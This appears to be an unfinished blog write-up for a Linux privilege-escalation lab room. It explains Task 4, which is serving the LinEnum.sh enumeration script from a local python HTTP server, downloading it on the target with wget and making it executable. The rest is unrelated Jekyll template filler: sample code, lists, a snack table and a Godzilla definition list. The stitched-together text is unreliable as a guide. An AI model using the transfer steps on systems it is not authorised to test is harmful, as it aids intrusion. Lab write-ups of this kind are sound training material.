---
title: Common Linux PrivEsc detailed write-up
published: true
---
Tasks **1**, **2** and **3** don't need explanation.

## [](#header-2)Task 4

To get LinEnum on the target's machine, you need to start a server on your local machine (it has to be in the directory where you store LinEnum.sh or you will have to provide the path to it afterwards) and connect to it from the target :

<img src="https://raw.githubusercontent.com/peixetlift/peixetlift.github.io/master/assets/LinuxPrivEsc/python%20listener%20server4.png" class="border" />
<style>
  .border {   
  border-width: 2px;
  border-color: #7FFF00;
  border-style: groove;
  box-shadow: 0px 0px 2px 4px #ADFF2F} 
</style>
  
```
python3 -m http.server 8000
```

>The "-m" option is used to search a module and run the corresponding python script, which in this case is an http server.
>The number 8000 is the port that our server will be listening in, you can select any port that's not being used.

Once the server is started, you can request the file you want from the target's console :


![](https://raw.githubusercontent.com/peixetlift/peixetlift.github.io/master/assets/LinuxPrivEsc/wget%20linenum4.png)

```
wget <YOUR MACHINE'S @IP>:8000/LinEnum.sh
```

>wget is a network downloader
>By using this command, we are downloading the file LinEnum.sh from the server in <YOUR MACHINE'S @IP> that we started before.


Now that LinEnum.sh is on the target's machine, we need to make it executable (because we need to run it in order to start the enumeration process), this is done by using :

```
chmod +x LinEnum.sh
```

To see how Linux file permissions work, you can visit [this page](https://www.redhat.com/sysadmin/manage-permissions) 


### [](#header-3)Header 3

```js
// Javascript code with syntax highlighting.
var fun = function lang(l) {
  dateformat.i18n = require('./lang/' + l)
  return true;
}
```

```ruby
# Ruby code with syntax highlighting
GitHubPages::Dependencies.gems.each do |gem, version|
  s.add_dependency(gem, "= #{version}")
end
```

#### [](#header-4)Header 4

*   This is an unordered list following a header.
*   This is an unordered list following a header.
*   This is an unordered list following a header.

##### [](#header-5)Header 5

1.  This is an ordered list following a header.
2.  This is an ordered list following a header.
3.  This is an ordered list following a header.

###### [](#header-6)Header 6

| head1        | head two          | three |
|:-------------|:------------------|:------|
| ok           | good swedish fish | nice  |
| out of stock | good and plenty   | nice  |
| ok           | good `oreos`      | hmm   |
| ok           | good `zoute` drop | yumm  |

### There's a horizontal rule below this.

* * *

### Here is an unordered list:

*   Item foo
*   Item bar
*   Item baz
*   Item zip

### And an ordered list:

1.  Item one
1.  Item two
1.  Item three
1.  Item four

### And a nested list:

- level 1 item
  - level 2 item
  - level 2 item
    - level 3 item
    - level 3 item
- level 1 item
  - level 2 item
  - level 2 item
  - level 2 item
- level 1 item
  - level 2 item
  - level 2 item
- level 1 item

### Small image

![](https://assets-cdn.github.com/images/icons/emoji/octocat.png)

### Large image

![](https://guides.github.com/activities/hello-world/branching.png)


### Definition lists can be used with HTML syntax.

<dl>
<dt>Name</dt>
<dd>Godzilla</dd>
<dt>Born</dt>
<dd>1952</dd>
<dt>Birthplace</dt>
<dd>Japan</dd>
<dt>Color</dt>
<dd>Green</dd>
</dl>

```
Long, single-line code blocks should not wrap. They should horizontally scroll if they are too long. This line should be long enough to demonstrate this.
```

```
The final element.
```
